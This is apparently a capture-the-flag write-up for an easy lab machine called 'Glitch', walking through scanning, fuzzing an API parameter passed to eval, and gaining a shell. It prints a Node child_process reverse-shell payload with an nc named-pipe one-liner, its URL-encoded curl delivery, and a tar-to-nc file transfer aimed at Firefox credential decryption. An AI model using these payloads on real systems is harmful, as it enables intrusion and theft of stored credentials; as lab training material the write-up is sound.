# GLITCH
## Difficulty Easy

## NMAP
```bash
nmap -sC -sV 10.201.105.28 -oN nmap_report
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 12:47 WIB
Nmap scan report for 10.201.105.28
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: not allowed
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.33 seconds
```
## Enumeration
- Go to Website
- found
```html

    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
```
- Console
```
getAccess()
undefined
Object { token: "dGhpc19pc19ub3RfcmVhbA==" }
​
token: "dGhpc19pc19ub3RfcmVhbA=="
​
<prototype>: Object { … }
10.201.105.28:27:21
```
- using CyberChef `From BASE64`
- we found 
```txt
this_is_not_real
```
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/api/objects.txt -X POST --hc 404,400 10.201.87.152/api/items\?FUZZ\=test
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.201.87.152/api/items?FUZZ=test
Total requests: 3132

=====================================================================
ID           Response   Lines    Word       Chars       Payload                             
=====================================================================

000000358:   500        10 L     64 W       1081 Ch     "cmd"                               

Total time: 0
Processed Requests: 3132
Filtered Requests: 3131
Requests/sec.: 0
```
```bash
curl -X POST 10.201.87.152/api/items\?cmd\=ls
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: ls is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```
- Reverse Shell Payload
```txt
require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.253 4444 >/tmp/f ')
```

```bash
curl -X POST 10.201.93.224/api/items\?cmd\=%72%65%71%75%69%72%65%28%22%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%22%29%2e%65%78%65%63%28%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%39%2e%31%2e%32%35%33%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%20%27%29
```
```bash
nc -nvlp 4444 
listening on [any] 4444 ...
connect to [10.9.1.253] from (UNKNOWN) [10.201.93.224] 49492
/bin/sh: 0: can't access tty; job control turned off
$ 
```
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
user@ubuntu:/var/web$ ls /home
ls /home
user  v0id
user@ubuntu:/var/web$ cd /home/user
cd /home/user
user@ubuntu:~$ ls
ls
user.txt
user@ubuntu:~$ cat user.txt
cat user.txt
THM{i_don't_know_why}
user@ubuntu:~$ 
```
```bash
user@ubuntu:~$ mkdir firefox
mkdir firefox
user@ubuntu:~$ cd firefox
cd firefox
user@ubuntu:~/firefox$ tar cf - . | nc 10.9.1.253 9002        
tar cf - . | nc 10.9.1.253 9002
user@ubuntu:~/firefox$ git clone https://github.com/unode/firefox_decrypt.git
git clone https://github.com/unode/firefox_decrypt.git

```
```bash
scp firefox.tgz 10.201.93.224@10.9.1.253:
```